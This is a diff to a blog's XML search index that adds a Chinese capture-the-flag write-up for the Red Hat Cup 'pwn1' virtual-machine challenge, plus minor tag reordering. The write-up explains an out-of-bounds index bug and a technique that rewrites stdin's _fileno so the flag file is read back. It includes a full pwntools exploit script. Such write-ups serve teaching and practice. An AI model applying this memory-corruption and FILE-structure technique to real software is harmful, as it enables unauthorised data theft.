@@ -3,6 +3,42 @@
   
     
     <entry>
+      <title><![CDATA[红帽杯线下pwn1遇到IO_File新利用方法]]></title>
+      <url>/2019/11/29/%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BA%BF%E4%B8%8Bpwn1/</url>
+      <content type="html"><![CDATA[<p>修改<code>_fileno</code>来让<code>stdin</code>从<code>fd</code>中读数据</p>
+<p>文件都在：<a href="[https://github.com/DayJun/Blogs/tree/master/Articles/2019-%E7%BA%A2%E5%B8%BD%E6%9D%AF-%E7%B2%A4%E6%B5%B7%E4%B8%AD%E5%BF%83-pwn1](https://github.com/DayJun/Blogs/tree/master/Articles/2019-红帽杯-粤海中心-pwn1)">Github</a></p>
+<h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p>最开始它获取了flag文件的文件描述符，并把它用<code>dup2</code>映射到0x233，这样我们就知道0x233是flag的文件描述符</p>
+<p>然后定义了沙盒规则，不允许<code>execve</code>和<code>write</code>，且虚拟机本身只能输入0x40道指令</p>
+<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p>它在处理指令的时候，有使用寄存器中的值作为index来存取它定的内存区的数据的操作，但是它却没有对寄存器进行检查</p>
+<p>如果寄存器中是负数，那它就可以存取到内存区之外的数据，导致OOB</p>
+<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><ol>
+<li>读取到<code>_IO_2_1_stdin_</code>的地址</li>
+<li>将它加0x6c（即定位到它-4的位置)</li>
+<li>将栈地址覆盖成前两步修改后的地址</li>
+<li>用<code>push</code>操作把0x233写到<code>_IO_2_1_stdin_</code>的<code>_fileno</code></li>
+<li>最后的<code>scanf</code>后的<code>printf</code>就会把flag打印出来</li>
+</ol>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">success = <span class="keyword">lambda</span> x, y:log.success(x + <span class="string">' '</span>+ hex(y))</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./RHVM.bin'</span></span><br><span class="line">io = process(binary)</span><br><span class="line">o = &#123;<span class="string">"give"</span>:<span class="number">0x40</span>, <span class="string">"print"</span>:<span class="number">0x60</span>, <span class="string">"sub"</span>:<span class="number">208</span>, <span class="string">'memb'</span>:<span class="number">0x42</span>&#125;</span><br><span class="line">ops = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(a, b, c)</span>:</span></span><br><span class="line">    ops.append((a &lt;&lt; <span class="number">16</span>) + (b &lt;&lt; <span class="number">8</span>) + c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">moveBtoRA</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">0x40</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printS</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAsubRB</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">208</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RARdengyuRBM</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">0x42</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAMdengyuRBR</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">0x41</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAmulRB</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">0xc0</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAzuoyiRB</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">224</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAaddRB</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">160</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pushRA</span><span class="params">(a)</span>:</span></span><br><span class="line">    add(<span class="number">0x70</span>, <span class="number">0</span>, a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">moveBtoRA(<span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">moveBtoRA(<span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">RAsubRB(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">moveBtoRA(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">RAmulRB(<span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">RAsubRB(<span class="number">4</span>, <span class="number">3</span>)</span><br><span class="line">RARdengyuRBM(<span class="number">5</span>, <span class="number">4</span>)</span><br><span class="line">moveBtoRA(<span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line">RAzuoyiRB(<span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">moveBtoRA(<span class="number">7</span>, <span class="number">8</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">RAMdengyuRBR(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">moveBtoRA(<span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">RAaddRB(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">RAaddRB(<span class="number">4</span>, <span class="number">3</span>)</span><br><span class="line">RARdengyuRBM(<span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line">RAMdengyuRBR(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">moveBtoRA(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">moveBtoRA(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">RAzuoyiRB(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">RAzuoyiRB(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">pushRA(<span class="number">0</span>)</span><br><span class="line">printS()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(binary)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'EIP: '</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">'ESP: '</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">'Give me code length: '</span>)</span><br><span class="line">sl(str(len(ops)))</span><br><span class="line">ru(<span class="string">'Give me code: '</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ops:</span><br><span class="line">    sl(str(i))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要是利用方法对我来说比较新颖，特此记录一下</p>
+]]></content>
+      
+        <categories>
+            
+            <category> writeup </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[关于patch elf文件的一些思考]]></title>
       <url>/2019/11/18/%E5%85%B3%E4%BA%8Epatch-elf%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</url>
       <content type="html"><![CDATA[<p>近日，为了能在AWD中对二进制文件进行patch，特意研究了一下elf文件结构，并找寻patch新代码的方法</p>
@@ -509,11 +545,11 @@
         
         <tags>
             
-            <tag> CTF </tag>
-            
             <tag> chrome </tag>
             
             <tag> v8 </tag>
+            
+            <tag> CTF </tag>
             
         </tags>
         
@@ -956,11 +992,11 @@
             
             <tag> pwn </tag>
             
-            <tag> CTF </tag>
-            
             <tag> chrome </tag>
             
             <tag> v8 </tag>
+            
+            <tag> CTF </tag>
             
         </tags>
         
